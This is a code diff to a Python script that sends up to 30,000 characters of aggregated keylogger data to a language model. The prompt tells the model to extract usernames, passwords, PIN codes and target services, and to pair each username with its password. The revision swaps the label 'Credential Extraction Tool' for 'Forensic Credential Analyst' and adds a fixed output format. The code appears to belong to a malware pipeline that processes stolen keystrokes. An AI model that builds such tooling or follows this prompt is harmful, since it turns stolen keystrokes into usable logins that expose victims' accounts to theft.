@@ -96,21 +96,30 @@ def run_daily_routine():
 
     # DEFINE PROMPT
     prompt = f"""
-    You are a Credential Extraction Tool. 
-    Analyze the aggregated keylogger data below.
-    
-    Extract ONLY: 
-    - Potential Usernames / Emails
-    - Potential Passwords
-    - PIN Codes
-    - Target Services (URLs/Apps)
-    
-    RAW DATA START:
-    {raw_data[:30000]} 
-    RAW DATA END
-    
-    If no credentials are found, simply state "No credentials detected."
-    """
+        You are a Forensic Credential Analyst. 
+        Analyze the raw keylogger data below to identify login attempts.
+        
+        Your Goal: Match usernames to their corresponding passwords and websites.
+        
+        Strictly output the findings in this format for each set of credentials found:
+        ---------------------------------------------------
+        1. **Service:** [Website URL or Application Name]
+        **Username/ID:** [The email or username typed]
+        **Password:** [The password matched to this user]
+        ---------------------------------------------------
+        
+        Rules:
+        - If you see a username typed, look immediately after it for the password.
+        - Ignore navigation keys like [TAB], [ENTER], [BACKSPACE] in the final output (clean them up).
+        - If you are not 100% sure a password belongs to a user, mark it as "Uncertain".
+        - If no credentials are found, output ONLY: "No credentials detected."
+
+        RAW DATA START:
+        {raw_data[:30000]} 
+        RAW DATA END
+        
+        If no credentials are found, simply state "No credentials detected."
+        """
     
     # GENERATE & SEND 
     print("[*] Running AI Analysis...")
